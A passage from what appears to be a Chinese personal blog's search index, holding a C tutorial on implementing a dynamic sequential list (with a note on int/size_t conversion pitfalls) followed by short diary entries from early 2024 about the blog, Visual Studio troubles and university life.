/*realloc*/\n\n//\u540e\u7eed\u8981\u5b58\u50a8\u5176\u5b83\u7c7b\u578b\u65f6\u65b9\u4fbf\u66f4\u6539\ntypedef int SLDataType;  \n\n//\u987a\u5e8f\u8868\u7684\u52a8\u6001\u5b58\u50a8\ntypedef struct SeqList\n{\n    SLDataType* a;    //\u6307\u5411\u52a8\u6001\u5f00\u8f9f\u7684\u6570\u7ec4\n    int size;      //\u6709\u6548\u6570\u636e\u4e2a\u6570\n    int capacity;  //\u5bb9\u91cf\u5927\u5c0f\n}SeqList;\n\n//\u521d\u59cb\u5316\u987a\u5e8f\u8868\nvoid SeqListInit(SeqList* psl);\n\n//\u9500\u6bc1\u987a\u5e8f\u8868\nvoid SeqListDestory(SeqList* psl);\n\n//\u68c0\u67e5\u987a\u5e8f\u8868\u5bb9\u91cf\u662f\u5426\u6ee1\u4e86\uff0c\u597d\u8fdb\u884c\u589e\u5bb9\nvoid CheckCapacity(SeqList* psl);\n\n//\u987a\u5e8f\u8868\u5c3e\u63d2\nvoid SeqListPushBack(SeqList* psl, SLDataType x);//O(1)\n\n//\u987a\u5e8f\u8868\u5c3e\u5220\nvoid SeqListPopBack(SeqList* psl);//O(1)\n\n//\u987a\u5e8f\u8868\u5934\u63d2\nvoid SeqListPushFront(SeqList* psl, SLDataType x);//O(n)\n\n//\u987a\u5e8f\u8868\u5934\u5220\nvoid SeqListPopFront(SeqList* psl);//O(n)\n\n//\u6253\u5370\u987a\u5e8f\u8868\nvoid SeqListPrint(const SeqList* psl);\n\n//\u5728\u987a\u5e8f\u8868\u4e2d\u67e5\u627e\u6307\u5b9a\u503c\nint SeqListFind(const SeqList* psl, SLDataType x);\n\n//\u5728\u987a\u5e8f\u8868\u6307\u5b9a\u4e0b\u6807\u4f4d\u7f6e\u63d2\u5165\u6570\u636e\nvoid SeqListInsert(SeqList* psl, size_t pos, SLDataType x);\n\n//\u5728\u987a\u5e8f\u8868\u4e2d\u5220\u9664\u6307\u5b9a\u4e0b\u6807\u4f4d\u7f6e\u7684\u6570\u636e\nvoid SeqListErase(SeqList* psl, size_t pos);\n\n//\u67e5\u770b\u987a\u5e8f\u8868\u4e2d\u6570\u636e\u4e2a\u6570\nint SeqListSize(const SeqList* psl);\n\n//\u4fee\u6539\u6307\u5b9a\u4e0b\u6807\u4f4d\u7f6e\u7684\u6570\u636e\nvoid SeqListAt(SeqList* psl, size_t pos, SLDataType x);\n</code></pre>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#seqlistc","title":"SeqList.c \u4e2d\u5404\u4e2a\u63a5\u53e3\u51fd\u6570","text":""},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#1_1","title":"1\u3001\u521d\u59cb\u5316\u987a\u5e8f\u8868","text":"<p>\u8bb0\u5f97\u4e00\u5b9a\u8981\u52a0\u4e0a\u65ad\u8a00\uff0c\u9632\u6b62\u4f20\u8fdb\u6765\u7684\u6307\u9488\u4e3a\u7a7a</p> C<pre><code>void SeqListInit(SeqList* psl)\n{\n    assert(psl != NULL);  //\u65ad\u8a00\n\n    psl-&gt;a = NULL;  //\u521d\u59cb\u987a\u5e8f\u8868\u4e3a\u7a7a\n    psl-&gt;size = 0;  //\u521d\u59cb\u6570\u636e\u4e2a\u6570\u4e3a0\n    psl-&gt;capacity = 0;  //\u521d\u59cb\u7a7a\u95f4\u5bb9\u91cf\u4e3a0\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#2_1","title":"2\u3001\u9500\u6bc1\uff08\u91ca\u653e\uff09\u987a\u5e8f\u8868","text":"<p>\u8bb0\u5f97\u4e00\u5b9a\u8981\u52a0\u4e0a\u65ad\u8a00\uff0c\u9632\u6b62\u4f20\u8fdb\u6765\u7684\u6307\u9488\u4e3a\u7a7a</p> C<pre><code>void SeqListDestory(SeqList* psl)\n{\n    assert(psl != NULL);  //\u65ad\u8a00\n\n    free(psl-&gt;a);   //\u91ca\u653e\u52a8\u6001\u5f00\u8f9f\u7684\u7a7a\u95f4\n    psl-&gt;a = NULL;  //\u7f6e\u7a7a\n    psl-&gt;size = 0;  //\u6570\u636e\u4e2a\u6570\u7f6e0\n    psl-&gt;capacity = 0;  //\u7a7a\u95f4\u5bb9\u91cf\u5927\u5c0f\u7f6e0\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#3_1","title":"3\u3001\u68c0\u67e5\u987a\u5e8f\u8868\u5bb9\u91cf\u662f\u5426\u6ee1\u4e86\uff0c\u597d\u8fdb\u884c\u589e\u5bb9","text":"<p>\u4e3a\u4ec0\u4e48\u4e0d\u91c7\u53d6\u63d2\u4e00\u4e2a\u6570\u636e\uff0c\u589e\u5bb9\u4e00\u4e2a\u7a7a\u95f4\u7684\u65b9\u5f0f\u5462\uff0c\u56e0\u4e3a\u8fd9\u6837\u4e5f\u592a\u9ebb\u70e6\u4e86\uff0c\u4ee3\u4ef7\u4e5f\u592a\u5927\u4e86\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e3a\u4e86\u907f\u514d\u9891\u7e41\u7684\u589e\u5bb9\uff0c\u5f53\u7a7a\u95f4\u6ee1\u4e86\u540e\uff0c\u6211\u4eec\u4e0d\u4f1a\u4e00\u4e2a\u4e00\u4e2a\u7684\u53bb\u589e\uff0c\u800c\u662f\u4e00\u6b21\u589e\u5bb9 2 \u500d\uff0c\u5f53\u7136\u4e5f\u4e0d\u4f1a\u4e00\u6b21\u589e\u5bb9\u592a\u5927\uff0c\u6bd4\u5982 3 \u500d 4 \u500d\uff0c\u7a7a\u95f4\u53ef\u80fd\u4f1a\u6d6a\u8d39\uff0c2 \u500d\u662f\u4e00\u4e2a\u6298\u4e2d\u7684\u9009\u62e9\u3002</p> C<pre><code>void CheckCapacity(SeqList* psl)\n{\n    assert(psl != NULL);  //\u65ad\u8a00\n\n    if (psl-&gt;size == psl-&gt;capacity)  //\u68c0\u67e5\u5bb9\u91cf\uff0c\u6ee1\u4e86\u5219\u589e\u5bb9\n    {\n        size_t newcapacity;  //\u65b0\u5bb9\u91cf\n        if (psl-&gt;capacity == 0)\n            newcapacity = psl-&gt;capacity = 4;  //\u539f\u6765\u5bb9\u91cf\u4e3a0\uff0c\u6269\u5bb9\u4e3a4\n        else\n            newcapacity = 2 * psl-&gt;capacity;  //\u539f\u6765\u5bb9\u91cf\u4e0d\u4e3a0\uff0c\u6269\u5bb9\u4e3a\u539f\u6765\u76842\u500d\n\n        SLDataType* p = (SLDataType*)realloc(psl-&gt;a, newcapacity*sizeof(SLDataType));  //\u6269\u5bb9\n        if (p == NULL)\n        {\n            perror(\"realloc\");\n            exit(-1);\n        }\n        psl-&gt;a = p;  // p \u4e0d\u4e3a\u7a7a\uff0c\u5f00\u8f9f\u6210\u529f\n        psl-&gt;capacity = newcapacity;  //\u66f4\u65b0\u5bb9\u91cf\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#3_2","title":"3\u3001\u987a\u5e8f\u8868\u5c3e\u63d2","text":"C<pre><code>void SeqListPushBack(SeqList* psl, SLDataType x)\n{\n    assert(psl != NULL);  //\u65ad\u8a00\n\n    CheckCapacity(psl);  //\u68c0\u67e5\u987a\u5e8f\u8868\u5bb9\u91cf\u662f\u5426\u5df2\u6ee1\n\n    psl-&gt;a[psl-&gt;size] = x;  //\u5c3e\u63d2\u6570\u636e\n    psl-&gt;size++;  //\u6709\u6548\u6570\u636e\u4e2a\u6570+1\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#4","title":"4\u3001\u987a\u5e8f\u8868\u5c3e\u5220","text":"<p>\u4e0d\u77e5\u9053 SLDataType \u662f\u4ec0\u4e48\u7c7b\u578b\u7684\u6570\u636e\uff0c\u4e0d\u80fd\u5192\u7136\u7684\u5c06\u987a\u5e8f\u8868\u6700\u540e\u4e00\u4e2a\u6570\u636e\u8d4b\u503c\u4e3a 0\uff0c\u6211\u4eec\u53ea\u9700\u5c06\u6709\u6548\u6570\u636e\u4e2a\u6570 size \u51cf 1 \u5373\u53ef\u8fbe\u5230\u5c3e\u5220\u7684\u76ee\u7684\u3002</p> C<pre><code>void SeqListPopBack(SeqList* psl)\n{\n    assert(psl != NULL);  //\u65ad\u8a00\n    assert(psl-&gt;size &gt; 0);  //\u987a\u5e8f\u8868\u4e0d\u80fd\u4e3a\u7a7a\n\n    //\u4e0d\u77e5\u9053SLDataType\u662f\u4ec0\u4e48\u7c7b\u578b\u7684\u6570\u636e\uff0c\u4e0d\u80fd\u5192\u7136\u7684\u8d4b\u503c\u4e3a0\n    //psl-&gt;a[psl-&gt;size - 1] = 0;\n    psl-&gt;size--;  //\u6709\u6548\u6570\u636e\u4e2a\u6570-1\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#5","title":"5\u3001\u987a\u5e8f\u8868\u5934\u63d2","text":"<p>\u56e0\u4e3a\u987a\u5e8f\u8868\u662f\u8fde\u7eed\u5b58\u50a8\u7684\uff0c\u6240\u4ee5\u5934\u63d2\u65f6\u8981\u4f9d\u6b21\u632a\u52a8\u6570\u636e</p> C<pre><code>void SeqListPushFront(SeqList* psl, SLDataType x)\n{\n    assert(psl);  //\u65ad\u8a00\n    CheckCapacity(psl);  //\u68c0\u67e5\u987a\u5e8f\u8868\u5bb9\u91cf\u662f\u5426\u5df2\u6ee1\n\n    int i = 0;\n    for (i = psl-&gt;size - 1; i &gt;= 0; i--)  //\u987a\u5e8f\u8868\u4e2d[0,size-1]\u7684\u5143\u7d20\u4f9d\u6b21\u5411\u540e\u632a\u52a8\u4e00\u4f4d\n    {\n        psl-&gt;a[i + 1] = psl-&gt;a[i];\n    }\n    psl-&gt;a[0] = x;  //\u5934\u63d2\u6570\u636e\n    psl-&gt;size++;  //\u6709\u6548\u6570\u636e\u4e2a\u6570+1\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#6","title":"6\u3001\u987a\u5e8f\u8868\u5934\u5220","text":"<p>\u56e0\u4e3a\u987a\u5e8f\u8868\u662f\u8fde\u7eed\u5b58\u50a8\u7684\uff0c\u6240\u4ee5\u5934\u5220\u65f6\u8981\u4f9d\u6b21\u632a\u52a8\u6570\u636e</p> C<pre><code>void SeqListPopFront(SeqList* psl)\n{\n    assert(psl);  //\u65ad\u8a00\n    assert(psl-&gt;size &gt; 0);  //\u987a\u5e8f\u8868\u4e0d\u80fd\u4e3a\u7a7a\n\n    int i = 0;\n    for (i = 1; i &lt; psl-&gt;size; i++)  //\u987a\u5e8f\u8868\u4e2d[1,size-1]\u7684\u5143\u7d20\u4f9d\u6b21\u5411\u524d\u632a\u52a8\u4e00\u4f4d\n    {\n        psl-&gt;a[i - 1] = psl-&gt;a[i];\n    }\n    psl-&gt;size--;  //\u6709\u6548\u6570\u636e\u4e2a\u6570-1\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#7","title":"7\u3001\u6253\u5370\u987a\u5e8f\u8868","text":"C<pre><code>void SeqListPrint(const SeqList* psl)\n{\n    assert(psl != NULL);  //\u65ad\u8a00\n\n    if (psl-&gt;size == 0)  //\u5224\u65ad\u987a\u5e8f\u8868\u662f\u5426\u4e3a\u7a7a\n    {\n        printf(\"\u987a\u5e8f\u8868\u4e3a\u7a7a\\n\");\n        return;\n    }\n\n    int i = 0;\n    for (i = 0; i &lt; psl-&gt;size; i++)  //\u6253\u5370\u987a\u5e8f\u8868\n    {\n        printf(\"%d \", psl-&gt;a[i]);\n    }\n    printf(\"\\n\");\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#8","title":"8\u3001\u5728\u987a\u5e8f\u8868\u4e2d\u67e5\u627e\u6307\u5b9a\u503c","text":"C<pre><code>int SeqListFind(const SeqList* psl, SLDataType x)\n{\n    assert(psl);  //\u65ad\u8a00\n\n    int i = 0;\n    for (i = 0; i &lt; psl-&gt;size; i++)\n    {\n        if (psl-&gt;a[i] == x)\n        {\n            return i;  //\u67e5\u627e\u5230\uff0c\u8fd4\u56de\u8be5\u503c\u5728\u6570\u7ec4\u4e2d\u7684\u4e0b\u6807\n        }\n    }\n    return -1;  //\u6ca1\u6709\u67e5\u627e\u5230\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#9-int-size_t","title":"9\u3001\u5728\u987a\u5e8f\u8868\u6307\u5b9a\u4e0b\u6807\u4f4d\u7f6e\u63d2\u5165\u6570\u636e\uff08\u8981\u6ce8\u610f\u4e0b int \u4e0e size_t \u95f4\u7684\u8f6c\u6362\u95ee\u9898\uff09","text":"<p>\u5c06\u6307\u5b9a\u4f4d\u7f6e\u540e\u7684\u6240\u6709\u6570\u636e\u4f9d\u6b21\u5411\u540e\u632a\u52a8\u4e00\u4f4d\uff0c\u521d\u59cb\u4ee3\u7801\u5982\u4e0b\uff1a</p> C<pre><code>int i = 0;\nfor (i = psl-&gt;size - 1; i &gt;= pos; i--)\n    psl-&gt;a[i + 1] = psl-&gt;a[i];\n</code></pre> <ul> <li>\u539f\u5148\u8fd9\u79cd\u5199\u6cd5\uff0c\u5f53\u987a\u5e8f\u8868\u4e3a\u7a7a size = 0 \u65f6\uff0c\u4f1a\u5bfc\u81f4 i = -1\uff0c     \u6267\u884c i &gt;= pos \u65f6\uff0ci \u88ab\u7b97\u672f\u8f6c\u6362\u6210\u65e0\u7b26\u53f7\u6570\uff0c\u800c\u65e0\u7b26\u53f7\u6570\u7684 -1 \u662f\u4e00\u4e2a\u503c\u5f88\u5927\u7684\u6b63\u6570\uff0c     \u8fdc\u5927\u4e8e pos\uff0c\u6ee1\u8db3\u6761\u4ef6\u8fdb\u5165\u5faa\u73af\uff0c\u4f1a\u9020\u6210\u8d8a\u754c\u8bbf\u95ee</li> <li>\u6ce8\uff1a\u8f6c\u6362\u5e76\u4e0d\u4f1a\u6539\u53d8 i \u672c\u8eab\u7684\u503c\uff0c\u800c\u662f\u6267\u884c i &gt;= pos \u65f6\uff0c\u751f\u6210\u4e00\u4e2a\u4e34\u65f6\u7684\u503c\u4e0e pos \u6bd4\u8f83</li> <li>\u5982\u679c\u5728\u987a\u5e8f\u8868\u5934\u90e8\u63d2\u5165\u6570\u636e pos = 0\uff0ci \u6700\u7ec8\u4e5f\u4f1a\u51cf\u51cf\u53d8\u6210 -1\uff0c\u88ab\u7b97\u672f\u8f6c\u6362\u540e\u53d8\u6210\u4e00\u4e2a\u5f88\u5927\u7684\u6570</li> <li>\u603b\u7ed3\uff1a\u907f\u514d\u8d1f\u6570\u7ed9\u5230\u65e0\u7b26\u53f7\u6570\uff0c\u6216\u8005\u907f\u514d\u6709\u7b26\u53f7\u6570\u53d8\u6210\u8d1f\u6570\u540e\uff0c\u88ab\u7b97\u672f\u8f6c\u6362\u6216\u6574\u578b\u63d0\u5347\u540e\uff0c\u53d8\u6210\u4e00\u4e2a\u5f88\u5927\u7684\u6570</li> </ul> <p>\u4e0b\u9762\u8fd9\u6837\u5199\u5c31\u907f\u514d i \u53d8\u6210 -1 \u8d1f\u6570\u4e86</p> C<pre><code>void SeqListInsert(SeqList* psl, size_t pos, SLDataType x)\n{\n    assert(psl);  //\u65ad\u8a00\n    assert(pos &gt;= 0 &amp;&amp; pos &lt;= psl-&gt;size);  //\u68c0\u67e5pos\u4e0b\u6807\u7684\u5408\u6cd5\u6027\n\n    CheckCapacity(psl);  //\u68c0\u67e5\u987a\u5e8f\u8868\u5bb9\u91cf\u662f\u5426\u5df2\u6ee1\n\n    size_t i = 0;\n    for (i = psl-&gt;size; i &gt; pos; i--)  //\u5c06pos\u4f4d\u7f6e\u540e\u9762\u7684\u6570\u636e\u4f9d\u6b21\u5411\u540e\u632a\u52a8\u4e00\u4f4d\n    {\n        psl-&gt;a[i] = psl-&gt;a[i - 1];\n    }\n    psl-&gt;a[pos] = x;  //\u63d2\u5165\u6570\u636e\n    psl-&gt;size++;  //\u6709\u6548\u6570\u636e\u4e2a\u6570+1\n}\n</code></pre> <ul> <li>\u5b9e\u73b0\u4e86\u6b64\u63a5\u53e3\uff0c\u987a\u5e8f\u8868\u5934\u63d2\u76f8\u5f53\u4e8e\u5728\u4e0b\u6807\u4e3a 0 \u4f4d\u7f6e\u5904\u63d2\u5165\u6570\u636e\uff0c\u53ef\u4ee5\u6539\u8fdb\u4e0b\u987a\u5e8f\u8868\u5934\u63d2\u7684\u4ee3\u7801\uff1a</li> </ul> C<pre><code>void SeqListPushFront(SeqList* psl, SLDataType x)\n{\n    SeqListInsert(psl, 0, x);  //\u6539\u9020\u5934\u63d2\u63a5\u53e3\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#10","title":"10\u3001\u5728\u987a\u5e8f\u8868\u4e2d\u5220\u9664\u6307\u5b9a\u4e0b\u6807\u4f4d\u7f6e\u7684\u6570\u636e","text":"C<pre><code>void SeqListErase(SeqList* psl, size_t pos)\n{\n    assert(psl);  //\u65ad\u8a00\n    assert(psl-&gt;size &gt; 0);  //\u987a\u5e8f\u8868\u4e0d\u80fd\u4e3a\u7a7a\n    assert(pos &gt;= 0 &amp;&amp; pos &lt; psl-&gt;size);  //\u68c0\u67e5pos\u4e0b\u6807\u7684\u5408\u6cd5\u6027\n\n    size_t i = 0;\n    for (i = pos + 1; i &lt; psl-&gt;size; i++)  //\u5c06pos\u4f4d\u7f6e\u540e\u9762\u7684\u6570\u636e\u4f9d\u6b21\u5411\u524d\u632a\u52a8\u4e00\u4f4d\n    {\n        psl-&gt;a[i - 1] = psl-&gt;a[i];\n    }\n    psl-&gt;size--;  //\u6709\u6548\u6570\u636e\u4e2a\u6570-1\n}\n</code></pre> <ul> <li>\u5b9e\u73b0\u4e86\u6b64\u63a5\u53e3\uff0c\u987a\u5e8f\u8868\u5934\u5220\u76f8\u5f53\u4e8e\u5220\u9664\u4e0b\u6807\u4e3a 0 \u4f4d\u7f6e\u5904\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u6539\u8fdb\u4e0b\u987a\u5e8f\u8868\u5934\u5220\u7684\u4ee3\u7801\uff1a</li> </ul> C<pre><code>//\u987a\u5e8f\u8868\u5934\u5220\nvoid SeqListPopFront(SeqList* psl)\n{\n    SeqListErase(psl, 0);  //\u6539\u9020\u5934\u5220\u63a5\u53e3\n}\n</code></pre>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#11","title":"11\u3001\u67e5\u770b\u987a\u5e8f\u8868\u4e2d\u6709\u6548\u6570\u636e\u4e2a\u6570","text":"<ul> <li> <p>\u53ef\u80fd\u5927\u5bb6\u4f1a\u6709\u4e00\u4e2a\u7591\u95ee\uff0c\u6211\u5728\u4e3b\u51fd\u6570\u91cc\u9762\u76f4\u63a5\u901a\u8fc7\u5b9a\u4e49\u7684\u7ed3\u6784\u4f53\u53d8\u91cf\u76f4\u63a5\u8bbf\u95ee\u5c31\u597d\u4e86\u5440\uff0c\u4e3a\u5565\u8fd8\u8981\u5f04\u4e00\u4e2a\u51fd\u6570\u561e</p> </li> <li> <p>\u5728\u6570\u636e\u7ed3\u6784\u4e2d\u6709\u4e00\u4e2a\u7ea6\u5b9a\uff0c\u5982\u679c\u8981\u8bbf\u95ee\u6216\u4fee\u6539\u6570\u636e\u7ed3\u6784\u4e2d\u7684\u6570\u636e\uff0c\u4e0d\u8981\u76f4\u63a5\u53bb\u8bbf\u95ee\uff0c\u8981\u53bb\u8c03\u7528\u5b83\u7684\u51fd\u6570\u6765\u8bbf\u95ee\u548c\u4fee\u6539\uff0c\u8fd9\u6837\u66f4\u52a0\u89c4\u8303\u5b89\u5168\uff0c\u4e5f\u66f4\u65b9\u4fbf\u68c0\u67e5\u662f\u5426\u51fa\u73b0\u4e86\u8d8a\u754c\u7b49\u4e00\u4e9b\u9519\u8bef\u60c5\u51b5</p> </li> </ul> C<pre><code>size_t SeqListSize(const SeqList* psl)\n{\n    assert(psl);  //\u65ad\u8a00\n\n    return psl-&gt;size;\n}\n</code></pre> <p>\u8d8a\u754c\u4e0d\u4e00\u5b9a\u62a5\u9519\uff0c\u7cfb\u7edf\u5bf9\u8d8a\u754c\u7684\u68c0\u67e5\u662f\u4e00\u79cd\u62bd\u67e5</p> <ul> <li> <p>\u8d8a\u754c\u8bfb\u4e00\u822c\u662f\u68c0\u67e5\u4e0d\u51fa\u6765\u7684</p> </li> <li> <p>\u8d8a\u754c\u5199\u5982\u679c\u662f\u4fee\u6539\u5230\u6807\u5fd7\u4f4d\u624d\u4f1a\u68c0\u67e5\u51fa\u6765</p> </li> </ul> <p>\uff08\u7cfb\u7edf\u5728\u6570\u7ec4\u672b\u5c3e\u540e\u8bbe\u7684\u6709\u6807\u5fd7\u4f4d\uff0c\u8d8a\u754c\u5199\u65f6\uff0c\u6070\u597d\u4fee\u6539\u5230\u6807\u5fd7\u4f4d\u4e86\uff0c\u5c31\u4f1a\u88ab\u68c0\u67e5\u51fa\u6765\uff09</p>"},{"location":"DEC/Data-Structure/%E9%A1%BA%E5%BA%8F%E8%A1%A8/#12","title":"12\u3001\u4fee\u6539\u6307\u5b9a\u4e0b\u6807\u4f4d\u7f6e\u7684\u6570\u636e","text":"C<pre><code>void SeqListAt(SeqList* psl, size_t pos, SLDataType x)\n{\n    assert(psl);  //\u65ad\u8a00\n    assert(psl-&gt;size &gt; 0);  //\u987a\u5e8f\u8868\u4e0d\u80fd\u4e3a\u7a7a\n    assert(pos &gt;= 0 &amp;&amp; pos &lt; psl-&gt;size);  //\u68c0\u67e5pos\u4e0b\u6807\u7684\u5408\u6cd5\u6027\n\n    psl-&gt;a[pos] = x;  //\u4fee\u6539pos\u4e0b\u6807\u5904\u5bf9\u5e94\u7684\u6570\u636e\n}\n</code></pre>"},{"location":"ESSAY/","title":"\u968f\u7b14","text":"<p>\u70b9\u51fb\u5de6\u4fa7\u76ee\u5f55\u6253\u5f00\u6587\u7ae0</p>"},{"location":"ESSAY/jottings/2401/","title":"\u4faf\u9716\u94b0\u7684\u968f\u7b14\u8bb0 | 2401","text":""},{"location":"ESSAY/jottings/2401/#240130","title":"240130","text":"<p>\u4eca\u5929\u662f\u4e2a\u4eba\u535a\u5ba2 AnistonH.github.io \u7684\u751f\u65e5\uff01\uff01\uff01\uff01\uff01</p>"},{"location":"ESSAY/jottings/2402/","title":"\u4faf\u9716\u94b0\u7684\u968f\u7b14\u8bb0 | 2402","text":""},{"location":"ESSAY/jottings/2402/#240213","title":"240213","text":"<p>\u8fd9\u79cd\u9759\u6001\u7684\u76f4\u63a5\u628aMarkdown\u6587\u4ef6\u6e32\u67d3\u4e3aHTML\u7f51\u9875\uff0c\u611f\u89c9\u7f51\u7ad9\u5c55\u793a\u597d\u53d7\u9650\u5236\u554a\uff0c\u8981\u662f\u80fd\u5f04\u6210\u52a8\u6001\u7f51\u7ad9\u5c31\u597d\u4e86\uff0c\u90a3\u591a\u597d\u73a9\u3002</p>"},{"location":"ESSAY/jottings/2402/#240215","title":"240215","text":"<p>\u548c\u51ef\u5b50\u201c\u8003\u5bdf\u201d\u4e86\u5b81\u56fa\u3001\u9999\u4e50\uff0c\u8f6c\u6765\u8f6c\u53bb\u633a\u597d\u73a9\u2026\u2026\u665a\u4e0a\u548cLZH\u3001SXL\u3001LDK\u5728\u5929\u5916\u5929\u3002</p>"},{"location":"ESSAY/jottings/2402/#240217","title":"240217","text":"<p><code>halo</code>\u8c8c\u4f3c\u5f88\u597d\u770b\uff0c\u5728\u8003\u8651\u8981\u4e0d\u8981\u628a<code>Material for MkDocs</code>\u6362\u6210<code>halo</code>\u5efa\u7ad9\u5de5\u5177\uff0c\u4f46\u786e\u5b9e\u4e0d\u60f3\u6298\u817e\u4e86\uff0c\u60f3\u60f3\u7b2c\u4e00\u6b21\u5f04\u8fd9\u4e2a\u7684\u65f6\u5019\u88abgit\u652f\u914d\u7684\u6050\u60e7\u2026\u2026\u2026\u2026</p>"},{"location":"ESSAY/jottings/2402/#240218","title":"240218","text":"<p>\u5728\u5e73\u9065\u53e4\u57ce\u91cc\u5f53\u5fd7\u613f\u8005\u8fd8\u633a\u597d\u73a9\uff0c\u6e38\u5ba2\u7279\u522b\u7279\u522b\u591a\uff0c\u633a\u7d2f\u3002</p>"},{"location":"ESSAY/jottings/2402/#240220","title":"240220","text":"<p>\u4e0b\u597d\u5927\u7684\u96ea\u2026\u2026\u6709\u4e00\u53ea\u9ed1\u72d7\u5728\u5916\u9762\u8dd1\u3002</p>"},{"location":"ESSAY/jottings/2402/#240226","title":"240226","text":"<p>\u597d\u7126\u8651\u2026\u2026</p>"},{"location":"ESSAY/jottings/2402/#240227","title":"240227","text":"<p>\u7ec8\u4e8e\u53d1\u73b0\u4e86\uff0cMkDocs\u7279\u522b\u6162\u662f\u56e0\u4e3a\u5b83\u6784\u5efa\u7684\u65f6\u5019\u8981\u4e0b\u8f7d\u51e0\u4e2a\u6587\u4ef6\uff0c\u800c\u5b9e\u9a8c\u5ba4\u7684\u7f51\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u4e0b\u8f7d\u5f88\u6162\uff0c\u6539\u7528\u624b\u673a\u70ed\u70b9\u5c31OK\u4e86\u3002</p>"},{"location":"ESSAY/jottings/2403/","title":"\u4faf\u9716\u94b0\u7684\u968f\u7b14\u8bb0 | 2403","text":""},{"location":"ESSAY/jottings/2403/#240303","title":"240303","text":"<p>\u6691\u5047\u5012\u8ba1\u65f6125\u5929\u54c8\u54c8\u54c8\u54c8\u54c8</p>"},{"location":"ESSAY/jottings/2403/#240304","title":"240304","text":"<p>\u4e0d\u662f\uff0c\u5927\u5b66\u7269\u7406\u600e\u4e48\u8fd9\u4e48\u96be\u554a\uff1f</p>"},{"location":"ESSAY/jottings/2403/#240305","title":"240305","text":"<p>\u7126\u8651\u2026\u2026\u771f\u70e6\u3002</p>"},{"location":"ESSAY/jottings/2403/#240310","title":"240310","text":"<p>\u4e0b\u5348\u5b9e\u9a8c\u8bfe\u51e0\u4e4e\u4e00\u76f4\u5728\u6539\u4ee3\u7801\uff08\u4e09\u5143\u7ec4\uff0c\u53ef\u4ee5\u53bb\u201c\u5f00\u53d1--&gt;\u6570\u636e\u7ed3\u6784\u201d\u53bb\u770b\u770b\uff09\uff0cIt's funny.</p> <p>\u53d1\u73b0\u4e86\u4e00\u4e2a\u5f88\u597d\u770b\u5f88\u597d\u770b\u7684Typora\u4e3b\u9898\uff0c\u53eb\u505a<code>dyzj</code>\uff0c\u94fe\u63a5\u5728\u8fd9\u513fhttps://theme.typora.io/theme/dyzj/</p> <p>\u9f99\u5c71\u7684\u9e21\u4e1d\u9762\u771f\u96be\u5403\uff0c\u4e0a\u4e86\u5927\u5b66\u4ee5\u6765\u5403\u8fc7\u6700\u96be\u5403\u7684\u4e1c\u897f\u4e4b\u4e8c\uff0c\u4f60\u95ee\u6211\u4e4b\u4e00\u662f\u8c01\uff1f\u5927\u6982\u662f\u5e7f\u987a\u94c1\u76ae\u623f\u7684\u9e21\u86cb\u704c\u997c\u3002</p> <p>\u8fd9\u51e0\u5929\u5728\u7528Visual Studio\u7684\u65f6\u5019\u603b\u662f\u4f1a\u5361\u6b7b\uff08\u7f16\u8bd1\u7684\u65f6\u5019\uff09\uff0c\u6bcf\u6b21\u90fd\u53ea\u80fd\u901a\u8fc7\u4efb\u52a1\u7ba1\u7406\u5668\u6740\u6389\u4ed6\uff0c\u5373\u4f7f\u5c1d\u8bd5\u4fee\u590d\u5b89\u88c5\u4e5f\u65e0\u6d4e\u4e8e\u4e8b\uff0c\u751a\u81f3\u66f4\u4e25\u91cd\u4e86\uff0c\u4eca\u5929\u76f4\u63a5\u628a\u8d44\u6e90\u7ba1\u7406\u5668\u7ed9\u5361\u6b7b\u4e86\uff0c\u6700\u540e\u53ea\u80fd\u5f3a\u5236\u5173\u673a\u2026\u2026\u8bd5\u4e86\u4e0b\u7248\u672c\u56de\u9000\uff0c\u7ec8\u4e8e\u89e3\u51b3\u95ee\u9898\u4e86\uff0817.9.2 -----&gt; 17.9.1\uff09</p> <p>\u8bb0\u4f4f\uff0c\u662f\u751a\u81f3\uff08<code>shen</code>\uff09\uff0c\u4e0d\u662f<code>sheng</code>\u3002 </p>"},{"location":"ESSAY/jottings/2403/#240311","title":"240311","text":"<p>Visual Studio\u5361\u6b7b\u7684\u95ee\u9898\u5e76\u6ca1\u6709\u901a\u8fc7\u7248\u672c\u56de\u9000\u89e3\u51b3\uff0c\u6211\u53ea\u597d\u91cd\u88c5Visual Studio\uff0c\u8c8c\u4f3c\u662f\u6ca1\u5565\u95ee\u9898\u4e86\u3002</p> <p>\u611f\u5192\u3002</p>"},{"location":"ESSAY/jottings/2403/#240312","title":"240312","text":"<p>\u4e0d\u6b62\u5927\u7269\uff0c\u542c\u6570\u7535\u4e5f\u548c\u542c\u5929\u4e66\u4e00\u6837\u3002</p> 